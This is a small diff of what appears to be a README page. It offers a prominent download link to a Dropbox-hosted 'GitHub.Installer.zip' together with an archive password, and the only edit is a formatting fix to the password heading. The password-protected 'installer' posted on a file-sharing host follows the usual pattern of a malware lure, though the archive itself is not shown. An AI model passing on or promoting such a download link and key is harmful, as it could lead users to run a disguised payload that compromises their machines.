@@ -4,7 +4,7 @@
 
 # 🟧[DOWNLOAD](https://www.dropbox.com/scl/fi/vp3r9ecc1w0vq185qj147/GitHub.Installer.zip?dl=0&rlkey=mfusnaxb1vunisfa1r3ffzf65)
 
-#🔑Archive Key: 321
+# 🔑Archive Key: 321
 
 # Settings:
 
